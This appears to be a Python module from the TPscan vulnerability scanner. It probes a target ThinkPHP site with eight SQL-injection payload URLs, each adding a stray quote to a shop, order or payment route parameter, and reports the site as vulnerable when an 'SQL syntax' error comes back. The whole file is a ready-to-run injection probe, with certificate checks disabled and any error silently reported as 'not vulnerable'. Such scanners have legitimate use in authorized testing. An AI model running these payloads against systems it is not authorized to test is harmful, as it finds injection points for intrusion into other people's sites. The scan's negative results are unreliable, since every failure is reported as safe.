#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3

urllib3.disable_warnings()
from termcolor import colored


def thinkphp_multi_sql_leak_verify(url):
    """ thinkphp_multi_sql_leak_verify"""
    pocdict = {
        "vulnname": "thinkphp_multi_sql_leak",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": 'TPscan',
    }
    payloads = [
        r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
        r'index.php?s=/home/shopcart/getpriceNum/id/1%27',
        r'index.php?s=/home/user/cut/id/1%27',
        r'index.php?s=/home/service/index/id/1%27',
        r'index.php?s=/home/pay/chongzhi/orderid/1%27',
        r'index.php?s=/home/order/complete/id/1%27',
        r'index.php?s=/home/order/detail/id/1%27',
        r'index.php?s=/home/order/cancel/id/1%27',
    ]
    try:
        status = 0;
        for payload in payloads:
            vurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"SQL syntax" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = 'SQL syntax found'
                pocdict['response'] = req.status_code
                print(colored("[+] 目标存在 thinkphp_multi_sql_leak 漏洞\tpayload: ", "green"))
                print(colored(pocdict, 'green'))
                status = 1
                break
        if status == 0:
            print(colored("\n[*] 目标不存在 thinkphp_multi_sql_leak 漏洞", "red"))
    except:
        print(colored("\n[*] 目标不存在 thinkphp_multi_sql_leak 漏洞", "red"))
